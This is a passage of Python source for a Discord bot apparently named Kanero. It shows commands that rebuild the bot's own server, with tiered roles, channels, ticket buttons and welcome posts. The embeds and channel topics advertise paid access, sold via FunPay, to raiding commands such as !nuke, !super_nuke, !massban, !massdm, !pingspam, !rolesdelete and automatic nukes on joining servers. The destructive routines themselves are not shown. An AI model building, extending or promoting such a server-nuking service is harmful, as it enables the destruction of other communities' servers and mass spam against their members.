        value=f"{st(AUTO_SUPER_NUKE)}\nТекст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n`!auto_super_nuke on/off`",
        inline=False
    )
    embed.add_field(
        name="⚡ auto_superpr_nuke",
        value=f"{st(AUTO_SUPERPR_NUKE)}\nТекст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n`!auto_superpr_nuke on/off`",
        inline=False
    )
    embed.add_field(
        name="👑 auto_owner_nuke",
        value=f"{st(AUTO_OWNER_NUKE)}\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`\n`!auto_owner_nuke on/off`",
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  !auto_off — выключить все")
    await ctx.send(embed=embed)


async def _post_news_and_sell(guild: discord.Guild):
    """Постит сообщение в новости и sell после setup/setup_update. Заменяет только первое сообщение бота."""
    news_ch = discord.utils.find(lambda c: "новост" in c.name.lower() or "news" in c.name.lower(), guild.text_channels)
    sell_ch = discord.utils.find(lambda c: "sell" in c.name.lower(), guild.text_channels)
    changelog_ch = discord.utils.find(lambda c: "changelog" in c.name.lower(), guild.text_channels)
    addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)

    cl_mention = changelog_ch.mention if changelog_ch else "#changelog"
    ab_mention = addbot_ch.mention if addbot_ch else "#addbot"
    sell_mention = sell_ch.mention if sell_ch else "#sell"

    # Новости — удаляем только ПЕРВОЕ (самое старое) сообщение бота и постим новое
    if news_ch:
        try:
            first_bot_msg = None
            msgs = []
            async for msg in news_ch.history(limit=50, oldest_first=True):
                if msg.author.id == guild.me.id:
                    first_bot_msg = msg
                    break
            if first_bot_msg:
                try:
                    await first_bot_msg.delete()
                except Exception:
                    pass

            embed = discord.Embed(
                title="🔔 Бот обновлён!",
                description=(
                    f"📋 **История изменений:** {cl_mention}\n\n"
                    f"🆓 **Бесплатный доступ (freelist):**\n"
                    f"Напиши в {ab_mention}\n\n"
                    f"✅💎 **White / Premium и выше:**\n"
                    f"Загляни в {sell_mention}\n\n"
                    f"[Наш сервер](https://discord.gg/aud6wwYVRd)"
                ),
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await news_ch.send(content="@everyone", embed=embed)
        except Exception:
            pass

    # Sell — удаляем только ПЕРВОЕ (самое старое) сообщение бота и постим новое
    if sell_ch:
        try:
            first_bot_msg = None
            async for msg in sell_ch.history(limit=50, oldest_first=True):
                if msg.author.id == guild.me.id:
                    first_bot_msg = msg
                    break
            if first_bot_msg:
                try:
                    await first_bot_msg.delete()
                except Exception:
                    pass

            embed = discord.Embed(
                title="🛒 Купить доступ — Kanero",
                description=(
                    "**✅ White / 💎 Premium** — купить на FunPay:\n"
                    "https://funpay.com/users/16928925/\n\n"
                    "**📋 Freelist (бесплатно)** — напиши в этот канал любое сообщение"
                    if sell_ch and "sell" in sell_ch.name.lower() else
                    "**✅ White / 💎 Premium** — купить на FunPay:\n"
                    "https://funpay.com/users/16928925/"
                ),
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero  |  White · Premium")
            await sell_ch.send("@everyone", embed=embed)
        except Exception:
            pass


@bot.command(name="setup")
async def setup(ctx):
    """Пересоздать структуру сервера. Только для овнеров (OWNER_ID + OWNER_WHITELIST)."""
    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
        embed = discord.Embed(
            description="❌ Эта команда доступна только **овнерам** бота.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    guild = ctx.guild
    msg = await ctx.send("⚙️ Пересоздаю структуру сервера... (это займёт ~30 сек)")

    # ── 1. Удаляем все каналы и роли ──
    for ch in guild.channels:
        try:
            await ch.delete()
        except Exception:
            pass
    bot_role = guild.me.top_role
    for r in guild.roles:
        if r < bot_role and not r.is_default():
            try:
                await r.delete()
            except Exception:
                pass

    # ── 2. Создаём роли с правами ──
    guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False)
    user_perms    = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False)
    white_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False)
    premium_perms = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False)
    owner_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, manage_channels=True, manage_roles=True, manage_webhooks=True, kick_members=True, ban_members=True, manage_nicknames=True, view_audit_log=True, mention_everyone=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, mute_members=True, deafen_members=True, priority_speaker=True)
    dev_perms     = discord.Permissions(administrator=True)

    role_guest   = await guild.create_role(name="👤 Guest",     color=discord.Color.from_rgb(120, 120, 120), permissions=guest_perms,   hoist=False, mentionable=False)
    role_user    = await guild.create_role(name="👥 User",      color=discord.Color.from_rgb(180, 180, 180), permissions=user_perms,    hoist=True,  mentionable=False)
    role_white   = await guild.create_role(name="✅ White",     color=discord.Color.from_rgb(85, 170, 255),  permissions=white_perms,   hoist=True,  mentionable=False)
    role_premium = await guild.create_role(name="💎 Premium",   color=discord.Color.from_rgb(180, 80, 255),  permissions=premium_perms, hoist=True,  mentionable=False)
    role_owner   = await guild.create_role(name="👑 Owner",      color=discord.Color.from_rgb(255, 200, 0),   permissions=owner_perms,   hoist=True,  mentionable=False)
    role_dev     = await guild.create_role(name="🔧 Developer",  color=discord.Color.from_rgb(255, 60, 60),   permissions=dev_perms,     hoist=True,  mentionable=False)
    role_bot     = await guild.create_role(name="🤖 Kanero",     color=discord.Color.from_rgb(0, 200, 150),   permissions=dev_perms,     hoist=True,  mentionable=False)
    role_media   = await guild.create_role(name="🎬 Media",      color=discord.Color.from_rgb(255, 140, 0),   hoist=True, mentionable=False)
    role_mod     = await guild.create_role(name="🛡️ Moderator",  color=discord.Color.from_rgb(100, 180, 100), hoist=True,  mentionable=False)
    role_friend    = await guild.create_role(name="🤝 Friend",        color=discord.Color.from_rgb(30, 144, 255),  hoist=True,  mentionable=False)

    try:
        await guild.me.add_roles(role_bot)
    except Exception:
        pass

    # Порядок: Kanero > Developer > Owner > Premium > White > User > Guest
    try:
        bot_top = guild.me.top_role.position
        await role_bot.edit(position=max(1, bot_top - 1))
        await role_dev.edit(position=max(1, bot_top - 2))
        await role_owner.edit(position=max(1, bot_top - 3))
        await role_media.edit(position=max(1, bot_top - 4))
        await role_mod.edit(position=max(1, bot_top - 5))
        await role_friend.edit(position=max(1, bot_top - 6))
        await role_premium.edit(position=max(1, bot_top - 7))
        await role_white.edit(position=max(1, bot_top - 8))
        await role_user.edit(position=max(1, bot_top - 9))
        await role_guest.edit(position=1)
    except Exception:
        pass

    # ── СРАЗУ выдаём роль Guest всем у кого нет ролей ──
    try:
        guest_count = 0
        for member in guild.members:
            if member.bot:
                continue
            # Проверяем есть ли у участника роли (кроме @everyone)
            if len(member.roles) == 1:  # Только @everyone
                try:
                    await member.add_roles(role_guest, reason="Setup - авто-выдача Guest")
                    guest_count += 1
                except Exception:
                    pass
        if guest_count > 0:
            await ctx.send(f"✅ Выдана роль 👤 Guest **{guest_count}** участникам.")
    except Exception as e:
        print(f"Ошибка при выдаче Guest: {e}")

    # ── 3. @everyone — ничего не видит ──
    await guild.default_role.edit(permissions=discord.Permissions(read_messages=False, send_messages=False, connect=False))

    def _ow(read=False, write=False):
        return discord.PermissionOverwrite(read_messages=read, send_messages=write)

    def admin_ow():
        return {
            guild.default_role: _ow(False, False),
            role_guest:  _ow(True, False),
            role_user:   _ow(True, False),
            role_white:  _ow(True, False),
            role_premium:_ow(True, False),
            role_mod:    _ow(True, False),
            role_owner:  _ow(True, True),
            role_dev:    _ow(True, True),
        }

    # ── 4. Категории и каналы ──

    # ━━ 👋 WELCOME — виден всем ━━
    cat_welcome = await guild.create_category("━━━━ 👋 WELCOME ━━━━", overwrites={
        guild.default_role: _ow(True, False), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    })
    welcome_ch = await guild.create_text_channel("👋・welcome", category=cat_welcome, overwrites={
        guild.default_role: _ow(True, False), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Приветствие новых участников — бот пишет сюда автоматически")

    # ━━ 📢 ОСНОВНОЕ — Guest+ читает ━━
    cat_main = await guild.create_category("━━━━ 📢 ОСНОВНОЕ ━━━━", overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    })
    def readonly_ow():
        return {
            guild.default_role: _ow(), role_guest: _ow(True, False),
            role_user: _ow(True, False), role_white: _ow(True, False),
            role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
        }
    rules_ch  = await guild.create_text_channel("📜・правила",  category=cat_main, overwrites=readonly_ow(), topic="Правила сервера")
    await guild.create_text_channel("📰・новости",              category=cat_main, overwrites=readonly_ow(), topic="Новости Kanero — только Owner пишет")
    await guild.create_text_channel("📋・changelog",            category=cat_main, overwrites=readonly_ow(), topic="История обновлений — !changelogall")
    addbot_ch = await guild.create_text_channel("🤖・addbot",   category=cat_main, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, True),
        role_user: _ow(True, True), role_white: _ow(True, True),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Напиши сюда — получишь роль User и доступ к боту")
    await guild.create_text_channel("🖼️・медиа",               category=cat_main, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, False),
        role_user: _ow(True, False),
        role_media: discord.PermissionOverwrite(read_messages=True, send_messages=True, attach_files=True, embed_links=True),
        role_white: _ow(True, False), role_premium: _ow(True, False),
        role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Картинки, видео, мемы — писать только 🎬 Media")
    await guild.create_text_channel("🤝・партнёрство",          category=cat_main, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Предложения о партнёрстве — пишет только администрация")
    await guild.create_text_channel("🛒・sell",                  category=cat_main, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Продажа White/Premium — пишет только Owner")
    await guild.create_text_channel("🎫・выдача-вайта",          category=cat_main, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="!wl_add, !pm_add, !fl_add, !list, !setup, !auto_off — только Owner")
    await guild.create_text_channel("🎁・компенсация",           category=cat_main, overwrites={
        guild.default_role: _ow(True, False), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Компенсации и временные подписки — !компенсация")

    # ━━ 💬 ЧАТЫ — Guest+ пишет ━━
    cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━", overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, True),
        role_user: _ow(True, True), role_white: _ow(True, True),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    })
    await guild.create_text_channel("💬・общий", category=cat_chat, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, True),
        role_user: _ow(True, True), role_white: _ow(True, True),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Общий чат — доступен для всех участников с ролью")
    await guild.create_text_channel("💡・идеи", category=cat_chat, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, True),
        role_user: _ow(True, True), role_white: _ow(True, True),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Предложения и идеи для улучшения бота")
    # 🎫 create-ticket — виден всем Guest+, кнопка создаёт приватный канал
    ticket_ch = await guild.create_text_channel("🎫・create-ticket", category=cat_chat, overwrites={
        guild.default_role: _ow(), role_guest: _ow(True, False),
        role_user: _ow(True, False), role_white: _ow(True, False),
        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Нажми кнопку чтобы создать тикет поддержки")

    # ━━ 📋 FREELIST — User+ ━━
    cat_free = await guild.create_category("━━━━ 📋 FREELIST ━━━━", overwrites={
        guild.default_role: _ow(), role_guest: _ow(),
        role_user: _ow(True, True), role_white: _ow(True, True),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    })
    await guild.create_text_channel("📋・freelist-chat", category=cat_free, overwrites={
        guild.default_role: _ow(), role_guest: _ow(),
        role_user: _ow(True, True), role_white: _ow(True, True),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Чат для freelist — !nuke, !auto_nuke, !help, !changelog")
    await guild.create_text_channel("❓・помощь", category=cat_free, overwrites={
        guild.default_role: _ow(), role_guest: _ow(),
        role_user: _ow(True, True), role_white: _ow(True, True),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Вопросы и помощь по использованию бота")

    # ━━ ✅ WHITE — White+ ━━
    cat_wl = await guild.create_category("━━━━ ✅ WHITE ━━━━", overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
        role_white: _ow(True, True), role_premium: _ow(True, True),
        role_owner: _ow(True, True), role_dev: _ow(True, True),
    })
    await guild.create_text_channel("✅・white-chat", category=cat_wl, overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
        role_white: _ow(True, True), role_premium: _ow(True, True),
        role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Чат для White — !nuke [текст], !stop, !cleanup, !rename, !nicks_all")
    await guild.create_text_channel("🛠️・команды", category=cat_wl, overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
        role_white: _ow(True, True), role_premium: _ow(True, True),
        role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Использование команд — !webhooks, !clear, /sp, /spkd")

    # ━━ 💎 PREMIUM — Premium+ ━━
    cat_prem_cat = await guild.create_category("━━━━ 💎 PREMIUM ━━━━", overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    })
    await guild.create_text_channel("💎・premium-chat",  category=cat_prem_cat, overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Чат для Premium пользователей")
    await guild.create_text_channel("🔑・premium-info",  category=cat_prem_cat, overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Информация о Premium — что входит, как использовать")
    await guild.create_text_channel("🛠️・premium-tools", category=cat_prem_cat, overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
        role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="!super_nuke, !massban, !massdm, !auto_super_nuke и другие Premium команды")

    # ━━ � ВОЙСЫ — обычные каналы для общения ━━д
    cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━", overwrites={
        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=True),
        role_user:   discord.PermissionOverwrite(connect=False, view_channel=True),
        role_white:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_premium:discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
    })
    for i in range(1, 4):
        await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice, user_limit=10)
    await guild.create_voice_channel("💎 premium-voice", category=cat_voice, user_limit=20, overwrites={
        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
        role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
        role_white:  discord.PermissionOverwrite(connect=False, view_channel=False),
        role_premium:discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
    })
    await guild.create_voice_channel("👑 admin-voice", category=cat_voice, overwrites={
        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
        role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
        role_white:  discord.PermissionOverwrite(connect=False, view_channel=False),
        role_premium:discord.PermissionOverwrite(connect=False, view_channel=False),
        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
    })

    # ━━ 👑 ADMIN — только Owner+ ━━
    cat_admin = await guild.create_category("━━━━ 👑 ADMIN ━━━━", overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
        role_white: _ow(), role_premium: _ow(),
        role_owner: _ow(True, True), role_dev: _ow(True, True),
    })
    logs_ch = await guild.create_text_channel("📊・logs", category=cat_admin, overwrites=admin_ow(), topic="Логи нюков — !nukelogs")
    await guild.create_text_channel("💬・admin-chat", category=cat_admin, overwrites={
        guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
        role_white: _ow(), role_premium: _ow(), role_friend: _ow(),
        role_owner: _ow(True, True), role_dev: _ow(True, True),
    }, topic="Чат для Owner и Developer")

    # ── 5. Контент в каналы ──

    await welcome_ch.send(embed=discord.Embed(
        title="👋 Добро пожаловать на сервер Kanero!",
        description=(
            "Бот автоматически пишет сюда при входе нового участника.\n\n"
            "**Как начать:**\n"
            "1. Зайди в 🤖・addbot и напиши любое сообщение\n"
            "2. Получишь роль 👥 User и доступ к боту\n"
            "3. Добавь бота на свой сервер\n\n"
            "**Купить White/Premium:** загляни в 🎫・выдача-вайта\n"
            "**Поддержка:** создай тикет в 🎫・create-ticket\n"
            "**Сервер:** https://discord.gg/aud6wwYVRd"
        ), color=0x0a0a0a
    ).set_footer(text="☠️ Kanero"))

    r = discord.Embed(title="📜 Правила — Kanero", color=0x0a0a0a)
    r.add_field(name="📋 Правила", value="**1.** Уважай участников\n**2.** Без спама и флуда\n**3.** Без рекламы без разрешения\n**4.** Без доксинга\n**5.** Соблюдай Discord ToS\n**6.** Без токсика и оскорблений\n**7.** ⛔ **Попытка краша этого сервера запрещена**", inline=False)
    r.add_field(name="🎭 Уровни", value="🤖 Kanero · 🔧 Developer · 👑 Owner · 🎬 Media · �️ Moderator · �💎 Premium · 🤝 Friend · ✅ White · 👥 User · 👤 Guest", inline=False)
    r.add_field(name="🔑 Доступ", value="**User (freelist):** напиши в 🤖・addbot\n**White/Premium:** загляни в 🎫・выдача-вайта\n**Поддержка:** 🎫・create-ticket", inline=False)
    r.set_footer(text="☠️ Kanero  |  Нарушение = бан")
    await rules_ch.send(embed=r)

    a = discord.Embed(title="🤖 Получить доступ к Kanero", color=0x0a0a0a)
    a.add_field(name="📋 Freelist (бесплатно)", value="Напиши **любое сообщение** сюда\nПолучишь роль 👥 User:\n`!nuke` · `!auto_nuke` · `!help` · `!changelog`", inline=False)
    a.add_field(name="✅ White", value="`!nuke [текст]` · `!stop` · `!cleanup`\n`!rename` · `!nicks_all` · `!webhooks`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
    a.add_field(name="💎 Premium", value="`!super_nuke` · `!massban` · `!massdm`\n`!spam` · `!pingspam` · `!rolesdelete`\n`!auto_super_nuke` · `!auto_superpr_nuke`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
    a.set_footer(text="☠️ Kanero  |  Просто напиши что-нибудь")
    await addbot_ch.send(embed=a)

    # Тикеты — отправляем кнопку в create-ticket
    ticket_embed = discord.Embed(
        title="🎫 Поддержка — Kanero",
        description=(
            "Нужна помощь? Есть вопрос?\n\n"
            "Нажми кнопку ниже — бот создаст приватный канал только для тебя и администрации.\n\n"
            "• Вопросы по боту\n"
            "• Покупка White / Premium\n"
            "• Жалобы и предложения"
        ),
        color=0x0a0a0a
    )
    ticket_embed.set_footer(text="☠️ Kanero  |  Один тикет на пользователя")
    await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())

    await logs_ch.send(embed=discord.Embed(
        title="📊 Логи — Kanero",
        description="`!nukelogs` — логи нюков\n`!list` — whitelist/premium\n`!fl_list` — freelist\n`!auto_info` — статус авто нюков",
        color=0x0a0a0a
    ).set_footer(text="☠️ Kanero  |  Только Owner+"))

    # ── Постим в новости и sell ──
    await _post_news_and_sell(guild)

    embed = discord.Embed(
        title="✅ Kanero — Сервер настроен",
        description=(
            "**Роли:** 🤖 Kanero · 🔧 Developer · 👑 Owner · 💎 Premium · ✅ White · 👥 User · 👤 Guest\n\n"
            "**Каналы:**\n"
            "👋 WELCOME: welcome (все видят)\n"
            "📢 ОСНОВНОЕ: правила · новости · changelog · addbot · медиа · партнёрство · sell · выдача-вайта\n"
            "💬 ЧАТЫ: общий · идеи · create-ticket (Guest+)\n"
            "📋 FREELIST: freelist-chat · помощь (User+)\n"
            "✅ WHITE: white-chat · команды (White+)\n"
            "💎 PREMIUM: premium-chat · premium-info · premium-tools (Premium+)\n"
            "🔊 ВОЙСЫ: voice-1/2/3 · premium-voice · admin-voice\n"
            "👑 ADMIN: logs (Owner+)\n\n"
            f"Авто-роль при входе: <@&{AUTO_ROLE_ID}>\n"
            "Роль 👥 User выдаётся при написании в addbot."
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  !giverole @юзер @роль")
    await msg.edit(content=None, embed=embed)


@bot.command(name="setup_update")
async def setup_update(ctx):
    """Обновить сервер без удаления каналов. Только для овнеров."""
    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
        await ctx.send("❌ Только для овнеров.")
        return
    guild = ctx.guild
    msg = await ctx.send("🔄 Обновляю сервер без удаления каналов...")
    results = []

    # 1. @everyone — ничего не видит
    try:
        await guild.default_role.edit(permissions=discord.Permissions(
            read_messages=False, send_messages=False, connect=False, use_application_commands=False
        ))
        results.append("✅ @everyone обновлён")
    except Exception as e:
        results.append(f"❌ @everyone: {e}")

    # 2. Обновляем права ролей
    role_updates = {
        "👤 Guest":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False),
        "👥 User":    discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False),
        "✅ White":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False),
        "💎 Premium": discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False),
    }
    for rname, perms in role_updates.items():
        role = discord.utils.find(lambda r: r.name == rname, guild.roles)
        if role:
            try:
                await role.edit(permissions=perms)
                results.append(f"✅ {rname}")
            except Exception as e:
                results.append(f"❌ {rname}: {e}")
        else:
            results.append(f"⚠️ {rname} не найдена — создаю")
            try:
                await guild.create_role(name=rname)
            except Exception:
                pass

    # 3. Создаём отсутствующие роли
    for rname in ("🛡️ Moderator", "🎬 Media", "🤝 Friend"):
        if not discord.utils.find(lambda r: r.name == rname, guild.roles):
            try:
                await guild.create_role(name=rname)
                results.append(f"✅ Создана {rname}")
            except Exception:
                pass

    # 4. ADMIN — обновляем права и создаём admin-chat если нет
    def _ow(read=False, write=False):
        return discord.PermissionOverwrite(read_messages=read, send_messages=write)

    role_owner  = discord.utils.find(lambda r: r.name == "👑 Owner",    guild.roles)
    role_dev    = discord.utils.find(lambda r: r.name == "🔧 Developer", guild.roles)
    role_guest  = discord.utils.find(lambda r: r.name == "👤 Guest",    guild.roles)
    role_user   = discord.utils.find(lambda r: r.name == "👥 User",     guild.roles)
    role_white  = discord.utils.find(lambda r: r.name == "✅ White",    guild.roles)
    role_prem   = discord.utils.find(lambda r: r.name == "💎 Premium",  guild.roles)
    role_friend = discord.utils.find(lambda r: r.name == "🤝 Friend",   guild.roles)

    # ── СРАЗУ выдаём роль Guest всем у кого нет ролей ──
    if role_guest:
        try:
            guest_count = 0
            for member in guild.members:
                if member.bot:
                    continue
                # Проверяем есть ли у участника роли (кроме @everyone)
                if len(member.roles) == 1:  # Только @everyone
                    try:
                        await member.add_roles(role_guest, reason="Setup Update - авто-выдача Guest")
                        guest_count += 1
                    except Exception:
                        pass
            if guest_count > 0:
                results.append(f"✅ Выдана роль 👤 Guest {guest_count} участникам")
        except Exception as e:
            results.append(f"❌ Выдача Guest: {e}")

    # 4. ADMIN — обновляем права и создаём admin-chat если нет
    admin_cat = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
    if admin_cat:
        # Обновляем права существующих каналов
        for ch in admin_cat.channels:
            if "admin-chat" in ch.name.lower():
                continue  # admin-chat обрабатываем отдельно
            try:
                ow = {guild.default_role: discord.PermissionOverwrite(read_messages=False)}
                for r in guild.roles:
                    if r.name in ("👑 Owner", "🔧 Developer", "🤖 Kanero"):
                        ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
                await ch.edit(overwrites=ow)
            except Exception:
                pass
        # Создаём admin-chat если нет
        existing_names = [ch.name.lower() for ch in admin_cat.channels]
        if not any("admin-chat" in n for n in existing_names):
            try:
                ow = {guild.default_role: _ow()}
                if role_guest:  ow[role_guest]  = _ow(False, False)
                if role_user:   ow[role_user]   = _ow(False, False)
                if role_white:  ow[role_white]  = _ow(False, False)
                if role_prem:   ow[role_prem]   = _ow(False, False)
                if role_friend: ow[role_friend] = _ow(False, False)
                if role_owner:  ow[role_owner]  = _ow(True, True)
                if role_dev:    ow[role_dev]    = _ow(True, True)
                await guild.create_text_channel("💬・admin-chat", category=admin_cat, overwrites=ow, topic="Чат для Owner и Developer")
                results.append("✅ Создан 💬・admin-chat")
            except Exception as e:
                results.append(f"❌ admin-chat: {e}")
        results.append("✅ ADMIN обновлён")

    # 5. Создаём отсутствующие каналы в ОСНОВНОЕ
    cat_main = discord.utils.find(lambda c: "ОСНОВНОЕ" in c.name, guild.categories)
    if cat_main:
        existing = [ch.name.lower() for ch in cat_main.channels]
        missing_channels = []
        if not any("sell" in n for n in existing):
            missing_channels.append(("🛒・sell", "Продажа White/Premium — пишет только Owner"))
        if not any("выдача" in n for n in existing):
            missing_channels.append(("🎫・выдача-вайта", "!wl_add, !pm_add, !fl_add — только Owner"))
        for ch_name, topic in missing_channels:
            try:
                ow = {guild.default_role: _ow()}
                if role_guest: ow[role_guest] = _ow(True, False)
                if role_user:  ow[role_user]  = _ow(True, False)
                if role_white: ow[role_white] = _ow(True, False)
                if role_prem:  ow[role_prem]  = _ow(True, False)
                if role_owner: ow[role_owner] = _ow(True, True)
                if role_dev:   ow[role_dev]   = _ow(True, True)
                await guild.create_text_channel(ch_name, category=cat_main, overwrites=ow, topic=topic)
                results.append(f"✅ Создан {ch_name}")
            except Exception as e:
                results.append(f"❌ {ch_name}: {e}")

    # 7. Обновляем позиции ролей
    try:
        bot_top = ctx.guild.me.top_role.position
        if bot_top < 10:
            results.append(f"⚠️ Роль бота слишком низко (позиция {bot_top}) — подними роль **🤖 Kanero** вручную выше всех, затем повтори `!setup_update`")
        else:
            order = [
                ("🤖 Kanero",     bot_top - 1),
                ("🔧 Developer",  bot_top - 2),
                ("👑 Owner",      bot_top - 3),
                ("🎬 Media",      bot_top - 4),
                ("🛡️ Moderator",  bot_top - 5),
                ("🤝 Friend",       bot_top - 6),
                ("💎 Premium",    bot_top - 7),
                ("✅ White",      bot_top - 8),
                ("👥 User",       bot_top - 9),
                ("👤 Guest",      1),
            ]
            for rname, pos in order:
                r = discord.utils.find(lambda x, n=rname: x.name == n, guild.roles)
                if r:
                    try:
                        await r.edit(position=max(1, pos))
                    except Exception:
                        pass
            results.append("✅ Позиции ролей обновлены")
    except Exception as e:
        results.append(f"❌ Позиции ролей: {e}")

    embed = discord.Embed(
        title="🔄 Сервер обновлён",
        description="\n".join(results),
        color=0x0a0a0a
    )
